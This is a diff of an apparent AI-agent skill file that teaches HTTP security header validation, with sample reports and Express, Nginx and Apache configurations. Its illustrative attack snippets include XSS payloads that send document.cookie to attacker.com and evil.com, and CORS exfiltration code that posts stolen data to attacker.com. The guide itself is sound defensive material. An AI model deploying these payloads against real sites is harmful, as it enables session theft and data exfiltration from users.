@@ -1,400 +1,1047 @@
 ---
 name: security-headers
-description: Analyzes HTTP security headers for a given URL and provides a comprehensive security score. Checks for critical headers like HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy. Returns detailed scoring and recommendations.
-allowed-tools: Bash(curl:*), WebFetch
+description: Validate and implement HTTP security headers to protect web applications.
 ---
 
-# Security Headers Analyzer
+# Security Headers Skill
 
-This skill performs a comprehensive security headers analysis of any website by examining HTTP response headers and calculating a security score based on industry best practices.
-
-## When to Use
-
-```dot
-digraph when_to_use {
-    "User asks about security headers?" [shape=diamond];
-    "User provides URL?" [shape=diamond];
-    "security-headers" [shape=box style=filled fillcolor=lightgreen];
-    "Ask for URL" [shape=box];
-    "Use other skill" [shape=box];
-
-    "User asks about security headers?" -> "User provides URL?" [label="yes\n(headers, HSTS,\nCSP, security score)"];
-    "User asks about security headers?" -> "Use other skill" [label="no"];
-    "User provides URL?" -> "security-headers" [label="yes"];
-    "User provides URL?" -> "Ask for URL" [label="no"];
-}
-```
-
-Use this skill when:
-- User asks about website security headers
-- User wants to check HTTP security configuration
-- User mentions HSTS, CSP, X-Frame-Options, or other security headers
-- User wants to improve their website's security posture
-- User asks for a security audit of HTTP headers
-
-## Process Flow
-
-```dot
-digraph process_flow {
-    rankdir=TB;
-
-    subgraph cluster_fetch {
-        label="Step 1: Fetch Headers";
-        style=filled;
-        fillcolor=lightblue;
-        "Make HEAD request to URL" [shape=box];
-        "Follow redirects" [shape=box];
-        "Extract all response headers" [shape=box];
-    }
-
-    subgraph cluster_analysis {
-        label="Step 2: Header Analysis";
-        style=filled;
-        fillcolor=lightgreen;
-        "Check HSTS (25pts)" [shape=box];
-        "Check CSP (25pts)" [shape=box];
-        "Check X-Frame-Options (10pts)" [shape=box];
-        "Check X-Content-Type-Options (10pts)" [shape=box];
-        "Check Referrer-Policy (10pts)" [shape=box];
-        "Check Permissions-Policy (10pts)" [shape=box];
-        "Check COEP/COOP/CORP (10pts)" [shape=box];
-    }
-
-    subgraph cluster_quality {
-        label="Step 3: Quality Assessment";
-        style=filled;
-        fillcolor=lightyellow;
-        "Validate HSTS directive values" [shape=box];
-        "Parse and validate CSP policy" [shape=box];
-        "Check for insecure headers" [shape=box];
-        "Identify security issues" [shape=box];
-    }
-
-    subgraph cluster_scoring {
-        label="Step 4: Score Calculation";
-        style=filled;
-        fillcolor=lightcoral;
-        "Sum header scores" [shape=box];
-        "Apply penalties for issues" [shape=box];
-        "Calculate final grade (A+ to F)" [shape=box];
-    }
-
-    "Start: Receive URL" [shape=oval style=filled fillcolor=lightgray];
-    "Request failed?" [shape=diamond];
-    "Return error message" [shape=box];
-    "Format report" [shape=box];
-    "End: Return security report" [shape=oval style=filled fillcolor=lightgray];
-
-    "Start: Receive URL" -> "Make HEAD request to URL";
-    "Make HEAD request to URL" -> "Follow redirects";
-    "Follow redirects" -> "Extract all response headers";
-    "Extract all response headers" -> "Request failed?";
-    
-    "Request failed?" -> "Return error message" [label="yes"];
-    "Return error message" -> "End: Return security report";
-    
-    "Request failed?" -> "Check HSTS (25pts)" [label="no"];
-    "Check HSTS (25pts)" -> "Check CSP (25pts)";
-    "Check CSP (25pts)" -> "Check X-Frame-Options (10pts)";
-    "Check X-Frame-Options (10pts)" -> "Check X-Content-Type-Options (10pts)";
-    "Check X-Content-Type-Options (10pts)" -> "Check Referrer-Policy (10pts)";
-    "Check Referrer-Policy (10pts)" -> "Check Permissions-Policy (10pts)";
-    "Check Permissions-Policy (10pts)" -> "Check COEP/COOP/CORP (10pts)";
-    "Check COEP/COOP/CORP (10pts)" -> "Validate HSTS directive values";
-    
-    "Validate HSTS directive values" -> "Parse and validate CSP policy";
-    "Parse and validate CSP policy" -> "Check for insecure headers";
-    "Check for insecure headers" -> "Identify security issues";
-    "Identify security issues" -> "Sum header scores";
-    
-    "Sum header scores" -> "Apply penalties for issues";
-    "Apply penalties for issues" -> "Calculate final grade (A+ to F)";
-    "Calculate final grade (A+ to F)" -> "Format report";
-    "Format report" -> "End: Return security report";
-}
-```
+Validate and implement HTTP security headers to protect web applications.
 
 ## Instructions
 
-### 1. Fetch HTTP Headers
+You are a web security headers expert. When invoked:
 
-Make a HEAD request to the provided URL to fetch headers:
+1. **Analyze Security Headers**:
+   - Scan HTTP response headers
+   - Identify missing security headers
+   - Check header configurations
+   - Detect misconfigurations
+   - Validate CSP policies
+   - Review CORS settings
 
+2. **Security Assessment**:
+   - Rate header security posture
+   - Identify vulnerabilities
+   - Check compliance with best practices
+   - Test for bypass techniques
+   - Validate header syntax
+
+3. **Attack Prevention**:
+   - XSS (Cross-Site Scripting)
+   - Clickjacking
+   - MIME-sniffing attacks
+   - Man-in-the-Middle attacks
+   - Information disclosure
+   - Cache poisoning
+   - Protocol downgrade attacks
+
+4. **Compliance Checking**:
+   - OWASP recommendations
+   - Security standards (PCI-DSS, HIPAA)
+   - Browser compatibility
+   - Performance impact assessment
+
+5. **Generate Report**: Provide comprehensive header analysis with implementation guidance
+
+## Critical Security Headers
+
+### Content Security Policy (CSP)
+**Purpose**: Prevent XSS attacks by controlling resource loading
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.googleapis.com; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
+```
+
+**Directives**:
+- `default-src`: Fallback for other directives
+- `script-src`: JavaScript sources
+- `style-src`: CSS sources
+- `img-src`: Image sources
+- `font-src`: Font sources
+- `connect-src`: AJAX, WebSocket, EventSource
+- `frame-src`: Iframe sources
+- `frame-ancestors`: Pages that can embed this page
+- `base-uri`: Base tag URLs
+- `form-action`: Form submission targets
+
+### Strict-Transport-Security (HSTS)
+**Purpose**: Force HTTPS connections
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+**Parameters**:
+- `max-age`: Duration in seconds (recommended: 31536000 = 1 year)
+- `includeSubDomains`: Apply to all subdomains
+- `preload`: Include in browser preload lists
+
+### X-Frame-Options
+**Purpose**: Prevent clickjacking attacks
+
+```http
+X-Frame-Options: DENY
+```
+
+**Values**:
+- `DENY`: Cannot be framed at all
+- `SAMEORIGIN`: Can only be framed by same origin
+- `ALLOW-FROM uri`: Deprecated, use CSP instead
+
+### X-Content-Type-Options
+**Purpose**: Prevent MIME-sniffing attacks
+
+```http
+X-Content-Type-Options: nosniff
+```
+
+### X-XSS-Protection
+**Purpose**: Enable browser XSS filter (legacy, CSP is preferred)
+
+```http
+X-XSS-Protection: 1; mode=block
+```
+
+**Note**: Deprecated in favor of Content-Security-Policy
+
+### Referrer-Policy
+**Purpose**: Control referrer information
+
+```http
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+**Values**:
+- `no-referrer`: Never send referrer
+- `no-referrer-when-downgrade`: Default behavior
+- `origin`: Send only origin
+- `origin-when-cross-origin`: Full URL for same-origin
+- `same-origin`: Only for same-origin requests
+- `strict-origin`: Origin only, not on HTTPS→HTTP
+- `strict-origin-when-cross-origin`: Recommended
+- `unsafe-url`: Always send full URL (not recommended)
+
+### Permissions-Policy
+**Purpose**: Control browser features and APIs
+
+```http
+Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()
+```
+
+### Cross-Origin Headers
+
+#### CORP (Cross-Origin-Resource-Policy)
+```http
+Cross-Origin-Resource-Policy: same-origin
+```
+
+#### COEP (Cross-Origin-Embedder-Policy)
+```http
+Cross-Origin-Embedder-Policy: require-corp
+```
+
+#### COOP (Cross-Origin-Opener-Policy)
+```http
+Cross-Origin-Opener-Policy: same-origin
+```
+
+## Usage Examples
+
+```
+@security-headers
+@security-headers https://example.com
+@security-headers --check-csp
+@security-headers --report
+@security-headers --fix
+@security-headers localhost:3000
+```
+
+## Header Scanning Commands
+
+### Using curl
 ```bash
-curl -I -L -s "[url]"
+# Check all headers
+curl -I https://example.com
+
+# Check specific header
+curl -I https://example.com | grep -i "content-security-policy"
+
+# Follow redirects
+curl -IL https://example.com
+
+# Detailed headers
+curl -v https://example.com 2>&1 | grep -i "^< "
 ```
 
-Options:
-- `-I` : HEAD request (headers only)
-- `-L` : Follow redirects
-- `-s` : Silent mode
+### Using online tools
+```bash
+# Mozilla Observatory
+curl "https://http-observatory.security.mozilla.org/api/v1/analyze?host=example.com"
 
-Extract all headers from the response, especially security-related ones.
-
-### 2. Analyze Security Headers
-
-Check for presence and quality of each security header:
-
-#### Strict-Transport-Security (HSTS) - 25 points
-**Scoring:**
-- Not present: 0 points
-- Present without directives: 10 points
-- Present with `max-age` only: 15 points
-- Present with `max-age` and `includeSubDomains`: 20 points
-- Present with `max-age`, `includeSubDomains`, and `preload`: 25 points
-
-**Quality checks:**
-- `max-age` should be at least 31536000 (1 year)
-- Should include `includeSubDomains`
-- Ideally includes `preload`
-
-**Penalties:**
-- `max-age` less than 10886400 (126 days): -5 points
-- Missing `includeSubDomains`: -2 points
-
-#### Content-Security-Policy (CSP) - 25 points
-**Scoring:**
-- Not present: 0 points
-- Present but with `unsafe-inline` or `unsafe-eval`: 10 points
-- Present with restrictive policy: 20 points
-- Present with strict policy and no unsafe directives: 25 points
-
-**Quality checks:**
-- Should define `default-src`, `script-src`, `style-src`
-- Should avoid `unsafe-inline` and `unsafe-eval`
-- Should use `nonce-` or `hash-` for inline scripts
-- Should include `upgrade-insecure-requests`
-- Should define `frame-ancestors`
-
-**Penalties:**
-- Contains `unsafe-inline` in `script-src`: -10 points
-- Contains `unsafe-eval` in `script-src`: -10 points
-- Contains `*` wildcard in `script-src` or `object-src`: -5 points
-- Missing `frame-ancestors`: -3 points
-
-#### X-Frame-Options - 10 points
-**Scoring:**
-- Not present: 0 points
-- Present with `ALLOW-FROM` (deprecated): 5 points
-- Present with `SAMEORIGIN`: 10 points
-- Present with `DENY`: 10 points
-
-**Note:** Can be replaced by CSP `frame-ancestors` directive (then award 10 points if CSP properly sets it).
-
-#### X-Content-Type-Options - 10 points
-**Scoring:**
-- Not present: 0 points
-- Present with value `nosniff`: 10 points
-- Present with other value: 0 points
-
-#### Referrer-Policy - 10 points
-**Scoring:**
-- Not present: 0 points
-- Present with weak policy (`unsafe-url`, `origin`, `no-referrer-when-downgrade`): 5 points
-- Present with strong policy (`no-referrer`, `same-origin`, `strict-origin`, `strict-origin-when-cross-origin`): 10 points
-
-#### Permissions-Policy - 10 points
-**Scoring:**
-- Not present: 0 points
-- Present with at least one directive: 10 points
-
-**Common directives to check:**
-- `geolocation`, `microphone`, `camera`, `payment`, `usb`, `magnetometer`, `gyroscope`, `accelerometer`
-
-#### Cross-Origin Policies - 10 points (Bonus)
-**Cross-Origin-Embedder-Policy (COEP):**
-- Present with `require-corp` or `credentialless`: +5 points
-
-**Cross-Origin-Opener-Policy (COOP):**
-- Present with `same-origin` or `same-origin-allow-popups`: +3 points
-
-**Cross-Origin-Resource-Policy (CORP):**
-- Present with `same-site`, `same-origin`, or `cross-origin`: +2 points
-
-### 3. Identify Security Issues
-
-Check for headers that leak information or pose security risks:
-
-**Information Disclosure (Penalties):**
-- `Server` header reveals detailed version: -5 points
-- `X-Powered-By` header present: -5 points
-- `X-AspNet-Version` header present: -5 points
-- `X-AspNetMvc-Version` header present: -5 points
-
-**Cookie Security Issues:**
-- Cookies without `Secure` flag: -3 points per cookie (max -9)
-- Cookies without `HttpOnly` flag: -3 points per cookie (max -9)
-- Cookies without `SameSite` attribute: -2 points per cookie (max -6)
-
-**CORS Issues:**
-- `Access-Control-Allow-Origin: *` on non-CDN: -5 points
-- `Access-Control-Allow-Credentials: true` with wildcard origin: -10 points
-
-### 4. Calculate Final Score and Grade
-
-**Total Score:** Sum of all header points minus penalties (0-100+ scale)
-
-**Grade Scale:**
-- **A+ (90-100+)**: Excellent security posture
-- **A (80-89)**: Good security with minor improvements needed
-- **B (70-79)**: Adequate security with some gaps
-- **C (60-69)**: Below average, several improvements needed
-- **D (50-59)**: Poor security, major improvements required
-- **F (0-49)**: Failing security posture, immediate action needed
-
-### 5. Format the Results
-
-Present the results in a clear, structured format:
-
+# Security Headers
+curl "https://securityheaders.com/?q=example.com&followRedirects=on"
 ```
-# Security Headers Report: [URL]
 
-## Security Grade: [GRADE] - [SCORE]/100
+### Using custom scripts
+```bash
+# Node.js header checker
+node check-headers.js https://example.com
+
+# Python header scanner
+python3 scan_headers.py https://example.com
+```
+
+## Security Headers Report Format
+
+```markdown
+# Security Headers Analysis Report
+
+**Website**: https://example.com
+**Scan Date**: 2024-01-15 14:30:00 UTC
+**Scanner**: Security Headers Analyzer v2.0
+
+---
+
+## Overall Security Score
+
+**Grade**: C
+**Score**: 62/100
+
+🔴 Critical Issues: 2
+🟠 High Priority: 3
+🟡 Medium Priority: 4
+🟢 Low Priority: 2
+
+**Status**: ⚠️  NEEDS IMPROVEMENT
+
+---
+
+## Executive Summary
+
+Your website is vulnerable to several common attacks due to missing or misconfigured security headers. The most critical issues are:
+
+1. Missing Content-Security-Policy (enables XSS attacks)
+2. Missing Strict-Transport-Security (vulnerable to MITM)
+3. Permissive CORS configuration
+
+**Immediate Actions Required**: Implement CSP and HSTS headers
+
+---
 
 ## Header Analysis
 
-| Header | Status | Score | Details |
-|--------|--------|-------|---------|
-| **Strict-Transport-Security** | ✓ Present / ✗ Missing | [X/25] | [Value or recommendation] |
-| **Content-Security-Policy** | ✓ Present / ✗ Missing | [X/25] | [Summary or issues] |
-| **X-Frame-Options** | ✓ Present / ✗ Missing | [X/10] | [Value or recommendation] |
-| **X-Content-Type-Options** | ✓ Present / ✗ Missing | [X/10] | [Value or recommendation] |
-| **Referrer-Policy** | ✓ Present / ✗ Missing | [X/10] | [Value or recommendation] |
-| **Permissions-Policy** | ✓ Present / ✗ Missing | [X/10] | [Value or recommendation] |
+### ✅ Headers Present (3)
 
-## Additional Headers (Bonus)
+#### X-Content-Type-Options: nosniff
+**Status**: ✅ Correctly configured
+**Grade**: A+
+**Purpose**: Prevents MIME-sniffing attacks
 
-| Header | Status | Score | Details |
-|--------|--------|-------|---------|
-| **Cross-Origin-Embedder-Policy** | ✓ Present / ✗ Missing | [+X] | [Value if present] |
-| **Cross-Origin-Opener-Policy** | ✓ Present / ✗ Missing | [+X] | [Value if present] |
-| **Cross-Origin-Resource-Policy** | ✓ Present / ✗ Missing | [+X] | [Value if present] |
-
-## Security Issues Found
-
-[If no issues found:]
-✓ No critical security issues detected.
-
-[If issues found:]
-### Critical Issues
-- [List critical issues with -X points each]
-
-### Warnings
-- [List warnings with -X points each]
-
-### Information Disclosure
-- [List info disclosure issues with -X points each]
-
-## Recommendations
-
-[Based on grade and missing headers, provide prioritized recommendations:]
-
-### High Priority
-1. [Most important missing/misconfigured headers]
-2. [Critical security issues to fix]
-
-### Medium Priority
-1. [Secondary improvements]
-2. [Header optimizations]
-
-### Low Priority
-1. [Nice-to-have additions]
-2. [Information disclosure cleanup]
-
-## Detailed Header Values
-
-[Show the actual header values for reference:]
-
-```
-[Header-Name]: [Header-Value]
-[Header-Name]: [Header-Value]
-...
+```http
+X-Content-Type-Options: nosniff
 ```
 
-## Quick Fix Examples
+**Impact**: Prevents browsers from interpreting files as different MIME types
+**Recommendation**: Keep this header
 
-[Provide code snippets for common server configurations:]
+---
 
-### Apache (.htaccess)
+#### X-Frame-Options: DENY
+**Status**: ✅ Correctly configured
+**Grade**: A+
+**Purpose**: Prevents clickjacking attacks
+
+```http
+X-Frame-Options: DENY
+```
+
+**Impact**: Prevents page from being embedded in frames
+**Recommendation**: Keep this header
+**Note**: Consider migrating to CSP frame-ancestors directive
+
+---
+
+#### Referrer-Policy: strict-origin-when-cross-origin
+**Status**: ✅ Good configuration
+**Grade**: A
+**Purpose**: Controls referrer information leakage
+
+```http
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+**Impact**: Balances privacy and functionality
+**Recommendation**: Optimal setting for most applications
+
+---
+
+### ❌ Missing Headers (5)
+
+#### Content-Security-Policy
+**Status**: 🔴 MISSING - CRITICAL
+**Grade**: F
+**Risk**: High - XSS attacks possible
+
+**Current**: Not set
+**Impact**:
+- No protection against XSS attacks
+- JavaScript can be injected from any source
+- Inline scripts execute without restriction
+- Third-party resources load without control
+
+**Vulnerability Example**:
+```html
+<!-- Attacker can inject: -->
+<script>
+  // Steal cookies
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
+
+  // Hijack session
+  window.location = 'https://attacker.com/phishing';
+</script>
+```
+
+**Recommended Configuration**:
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests
+```
+
+**Implementation**:
+
+**Express.js**:
+```javascript
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "'nonce-{random}'"],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "https:", "data:"],
+    fontSrc: ["'self'"],
+    connectSrc: ["'self'", "https://api.example.com"],
+    frameAncestors: ["'none'"],
+    baseUri: ["'self'"],
+    formAction: ["'self'"],
+    upgradeInsecureRequests: []
+  }
+}));
+```
+
+**Nginx**:
+```nginx
+add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests" always;
+```
+
+**Apache**:
 ```apache
-Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
-Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; ..."
-Header always set X-Frame-Options "DENY"
-Header always set X-Content-Type-Options "nosniff"
-Header always set Referrer-Policy "strict-origin-when-cross-origin"
-Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
+Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; font-src 'self'; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests"
 ```
 
-### Nginx
+**Testing**:
+```javascript
+// Use CSP in report-only mode first
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+
+// Backend endpoint to collect violations
+app.post('/csp-report', (req, res) => {
+  console.log('CSP Violation:', req.body);
+  res.status(204).end();
+});
+```
+
+**Priority**: P0 - Implement immediately
+
+---
+
+#### Strict-Transport-Security
+**Status**: 🔴 MISSING - CRITICAL
+**Grade**: F
+**Risk**: High - MITM attacks possible
+
+**Current**: Not set
+**Impact**:
+- No forced HTTPS
+- Vulnerable to SSL stripping attacks
+- Man-in-the-Middle attacks possible
+- Session hijacking risk
+
+**Vulnerability Example**:
+```
+User types: http://example.com
+→ Attacker intercepts unencrypted initial request
+→ Serves malicious page or steals credentials
+→ Even if site redirects to HTTPS, initial request is vulnerable
+```
+
+**Recommended Configuration**:
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+**Implementation**:
+
+**Express.js**:
+```javascript
+app.use(helmet.hsts({
+  maxAge: 31536000,
+  includeSubDomains: true,
+  preload: true
+}));
+```
+
+**Nginx**:
 ```nginx
 add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
-add_header Content-Security-Policy "default-src 'self'; script-src 'self'; ..." always;
-add_header X-Frame-Options "DENY" always;
-add_header X-Content-Type-Options "nosniff" always;
-add_header Referrer-Policy "strict-origin-when-cross-origin" always;
-add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
 ```
 
-### Cloudflare Workers
+**Apache**:
+```apache
+Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
+```
+
+**Prerequisites**:
+1. ✅ HTTPS fully working on all subdomains
+2. ✅ Valid SSL certificate
+3. ✅ No HTTP-only subdomains you want to keep
+
+**HSTS Preload Submission**:
+```
+1. Visit: https://hstspreload.org/
+2. Ensure max-age >= 31536000 (1 year)
+3. Include includeSubDomains directive
+4. Include preload directive
+5. Submit domain for preload list
+```
+
+**Warning**:
+- Start with short max-age (e.g., 300) for testing
+- Increase gradually: 300 → 86400 → 2592000 → 31536000
+- Preloading is difficult to undo
+
+**Priority**: P0 - Implement immediately
+
+---
+
+#### Permissions-Policy
+**Status**: 🟠 MISSING - HIGH
+**Grade**: D
+**Risk**: Medium - Unnecessary API access
+
+**Current**: Not set
+**Impact**:
+- No control over browser features
+- Third-party scripts can access camera, microphone, location
+- Potential privacy violations
+- Unexpected resource usage
+
+**Recommended Configuration**:
+```http
+Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()
+```
+
+**Implementation**:
+
+**Express.js**:
 ```javascript
-response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
-response.headers.set('Content-Security-Policy', "default-src 'self'; ...");
-response.headers.set('X-Frame-Options', 'DENY');
-response.headers.set('X-Content-Type-Options', 'nosniff');
-response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
-response.headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
+app.use((req, res, next) => {
+  res.setHeader('Permissions-Policy',
+    'geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()'
+  );
+  next();
+});
 ```
+
+**Nginx**:
+```nginx
+add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=(), interest-cohort=()" always;
 ```
 
-### 6. Error Handling
+**Custom Permissions** (if you need specific features):
+```http
+# Allow geolocation for your domain only
+Permissions-Policy: geolocation=(self), microphone=(), camera=()
 
-If the URL is unreachable:
-- Note that headers could not be fetched
-- Provide possible reasons (DNS failure, server down, firewall)
-- Skip the analysis
+# Allow camera for specific domain
+Permissions-Policy: camera=(self "https://trusted-video.com"), microphone=()
+```
 
-If the URL redirects:
-- Follow redirects automatically (already handled by `curl -L`)
-- Analyze the final destination's headers
-- Note the redirect chain if relevant
+**Priority**: P1 - Implement within 7 days
 
-### 7. Important Notes
+---
 
-**CSP Complexity:**
-- CSP policies can be very complex
-- Focus on detecting unsafe directives rather than perfect validation
-- Note if CSP is too restrictive (may break functionality)
+#### Cross-Origin-Resource-Policy
+**Status**: 🟡 MISSING - MEDIUM
+**Grade**: C
 
-**Header Precedence:**
-- `Content-Security-Policy` `frame-ancestors` takes precedence over `X-Frame-Options`
-- Some headers are deprecated but still in use
+**Recommended Configuration**:
+```http
+Cross-Origin-Resource-Policy: same-origin
+```
 
-**Context Matters:**
-- Public CDNs may legitimately use `Access-Control-Allow-Origin: *`
-- API endpoints may have different requirements than web pages
-- Development environments may intentionally have relaxed policies
+**Implementation**:
+```javascript
+app.use((req, res, next) => {
+  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
+  next();
+});
+```
 
-**HTTPS Requirement:**
-- Many security headers only make sense over HTTPS
-- Note if the site is not using HTTPS (major issue)
+**Values**:
+- `same-origin`: Only same-origin requests (recommended)
+- `same-site`: Same-site requests allowed
+- `cross-origin`: All origins allowed
 
-**Regional Differences:**
-- Some headers may be required by regulations (GDPR, etc.)
-- Check for region-specific security requirements
+**Priority**: P2 - Implement within 30 days
 
-## Example Usage
+---
 
-User: "Check the security headers for https://browser.style"
-User: "Analyze the HTTP security of example.com"
-User: "What's the security score for my website https://mysite.com?"
-User: "Does github.com have good security headers?"
+#### Cross-Origin-Embedder-Policy
+**Status**: 🟡 MISSING - MEDIUM
+**Grade**: C
 
-## Tips
+**Recommended Configuration**:
+```http
+Cross-Origin-Embedder-Policy: require-corp
+```
 
-- Use `curl -I -L -s` for efficient header-only requests
-- Parse CSP carefully as it can span multiple lines or be split
-- Pay special attention to `unsafe-inline` and `unsafe-eval` in CSP
-- Check for both old (`X-Frame-Options`) and new (CSP `frame-ancestors`) protection methods
-- Consider the context: a CDN may need different headers than a web app
-- Provide actionable recommendations, not just scores
-- Include code examples for common server configurations
+**Priority**: P2 - Implement within 30 days
+
+---
+
+### ⚠️  Misconfigured Headers (2)
+
+#### Access-Control-Allow-Origin: *
+**Status**: 🔴 CRITICAL MISCONFIGURATION
+**Grade**: F
+**Risk**: High - Open CORS policy
+
+**Current Configuration**:
+```http
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+```
+
+**Issue**:
+This configuration is **dangerous** and **invalid**. Wildcard (*) cannot be used with credentials.
+
+**Vulnerability**:
+```javascript
+// Any malicious site can make authenticated requests:
+fetch('https://example.com/api/user/data', {
+  credentials: 'include'  // Sends cookies
+})
+.then(res => res.json())
+.then(data => {
+  // Attacker steals user data
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+});
+```
+
+**Correct Configuration**:
+```javascript
+// Express.js - Dynamic CORS
+const allowedOrigins = [
+  'https://app.example.com',
+  'https://admin.example.com'
+];
+
+app.use((req, res, next) => {
+  const origin = req.headers.origin;
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
+  }
+  next();
+});
+```
+
+**Using CORS middleware**:
+```javascript
+const cors = require('cors');
+
+app.use(cors({
+  origin: function(origin, callback) {
+    if (!origin || allowedOrigins.includes(origin)) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization'],
+  exposedHeaders: ['X-Total-Count'],
+  maxAge: 600
+}));
+```
+
+**Nginx**:
+```nginx
+set $cors_origin "";
+if ($http_origin ~ "^https://(app|admin)\.example\.com$") {
+    set $cors_origin $http_origin;
+}
+
+add_header Access-Control-Allow-Origin $cors_origin always;
+add_header Access-Control-Allow-Credentials true always;
+add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE" always;
+add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
+```
+
+**Priority**: P0 - Fix immediately
+
+---
+
+#### X-XSS-Protection: 1; mode=block
+**Status**: ⚠️  DEPRECATED
+**Grade**: C
+
+**Current Configuration**:
+```http
+X-XSS-Protection: 1; mode=block
+```
+
+**Issue**: This header is deprecated and can create security vulnerabilities in some browsers.
+
+**Recommendation**: Remove this header and rely on Content-Security-Policy instead.
+
+**Migration**:
+```javascript
+// Remove X-XSS-Protection
+// Instead, implement strong CSP
+app.use(helmet({
+  xssFilter: false,  // Disable deprecated header
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"]
+    }
+  }
+}));
+```
+
+**Priority**: P2 - Update configuration
+
+---
+
+## Security Grade Breakdown
+
+| Category | Score | Grade |
+|----------|-------|-------|
+| XSS Protection | 20/30 | D |
+| Clickjacking Protection | 10/10 | A+ |
+| HTTPS Enforcement | 0/20 | F |
+| Information Disclosure | 15/15 | A |
+| CORS Configuration | 0/15 | F |
+| Browser Features | 0/10 | F |
+| **Overall** | **45/100** | **F** |
+
+---
+
+## Attack Vectors Still Possible
+
+### 1. Cross-Site Scripting (XSS)
+**Risk**: CRITICAL
+**Reason**: No Content-Security-Policy
+
+**Example Attack**:
+```html
+<!-- Stored XSS -->
+<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
+
+<!-- Reflected XSS -->
+https://example.com/search?q=<script>alert(document.cookie)</script>
+```
+
+**Mitigation**: Implement strict CSP
+
+---
+
+### 2. Man-in-the-Middle (MITM)
+**Risk**: CRITICAL
+**Reason**: No HSTS header
+
+**Example Attack**:
+```
+1. User connects to http://example.com (unencrypted)
+2. Attacker intercepts and serves fake login page
+3. User enters credentials
+4. Attacker captures credentials
+```
+
+**Mitigation**: Implement HSTS with preload
+
+---
+
+### 3. Cross-Origin Data Theft
+**Risk**: HIGH
+**Reason**: Permissive CORS configuration
+
+**Example Attack**:
+```javascript
+// From attacker.com:
+fetch('https://example.com/api/sensitive-data', {
+  credentials: 'include'
+})
+.then(r => r.json())
+.then(data => {
+  // Exfiltrate data
+  navigator.sendBeacon('https://attacker.com/log', JSON.stringify(data));
+});
+```
+
+**Mitigation**: Restrict CORS to trusted origins only
+
+---
+
+## Remediation Plan
+
+### Phase 1: Critical (Immediate - 24 hours)
+
+#### 1. Fix CORS Misconfiguration
+```javascript
+// Remove wildcard CORS
+- Access-Control-Allow-Origin: *
+
+// Implement origin whitelist
++ Access-Control-Allow-Origin: https://app.example.com
+```
+
+**Testing**:
+```bash
+# Test CORS from allowed origin
+curl -H "Origin: https://app.example.com" \
+     -I https://example.com/api/data
+
+# Test CORS from disallowed origin (should fail)
+curl -H "Origin: https://evil.com" \
+     -I https://example.com/api/data
+```
+
+**Risk**: Medium (may break integrations)
+**Estimated Time**: 2 hours
+
+---
+
+#### 2. Implement HSTS
+```nginx
+add_header Strict-Transport-Security "max-age=300" always;
+```
+
+**Testing Period**: 5 minutes (max-age=300)
+**Full Implementation**: Increase to 31536000 after testing
+
+**Testing**:
+```bash
+# Verify HSTS header
+curl -I https://example.com | grep -i strict-transport-security
+
+# Test forced HTTPS
+curl -IL http://example.com
+# Should redirect to https://
+```
+
+**Risk**: Low
+**Estimated Time**: 1 hour
+
+---
+
+### Phase 2: High Priority (Within 7 days)
+
+#### 3. Implement Content-Security-Policy
+
+**Week 1: Report-Only Mode**
+```http
